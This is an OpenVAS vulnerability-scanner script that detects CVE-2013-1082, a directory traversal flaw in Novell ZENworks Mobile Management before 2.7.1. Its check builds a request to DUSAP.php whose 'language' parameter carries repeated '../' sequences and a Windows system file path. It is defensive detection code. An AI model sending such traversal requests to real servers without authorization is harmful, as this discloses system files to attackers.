###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_novell_zenworks_mobile_mgmt_dir_trav_vuln.nasl 6093 2017-05-10 09:03:18Z teissa $
#
# Novell ZENworks Mobile Management Directory Traversal Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will let the attackers to disclose the contents
  of any file on the system via directory traversal sequences.
  Impact Level: Application";

tag_affected = "Novell ZENworks Mobile Management version before 2.7.1";
tag_insight = "Input passed via the 'language' parameter to DUSAP.php is not properly
  verified before being used to include files.";
tag_solution = "Upgrade to version 2.7.1 or later,
  For updates refer to http://www.novell.com";
tag_summary = "The host is installed with Novell ZENworks Mobile Management is
  prone to directory traversal vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803811";
CPE = "cpe:/a:novell:zenworks_mobile_management";

if (description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 6093 $");
  script_cve_id("CVE-2013-1082");
  script_bugtraq_id(60179);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-05-10 11:03:18 +0200 (Wed, 10 May 2017) $");
  script_tag(name:"creation_date", value:"2013-06-14 11:06:05 +0530 (Fri, 14 Jun 2013)");
  script_name("Novell ZENworks Mobile Management Directory Traversal Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/52545");
  script_xref(name : "URL" , value : "http://securitytracker.com/id?1028265");
  script_xref(name : "URL" , value : "http://www.novell.com/support/kb/doc.php?id=7011896");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_novell_zenworks_mobile_management_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("zenworks_mobile_management/installed");
  script_require_ports("Services/www", 80);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
url = "";
port = 0;
files = "";

## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Check the port status
if(!get_port_state(port))exit(0);

## Check Host Supports PHP
if(!can_host_php(port:port))exit(0);

files = traversal_files('windows');

foreach file (keys(files))
{
  ## Construct the Attack Request in the url.
  url = '/DUSAP.php?language=res/languages/' + crap(data:"../", length:6*9) + files[file];

  if(http_vuln_check(port:port, url:url, pattern:file))
  {
    security_message(port:port);
    exit(0);
  }
}
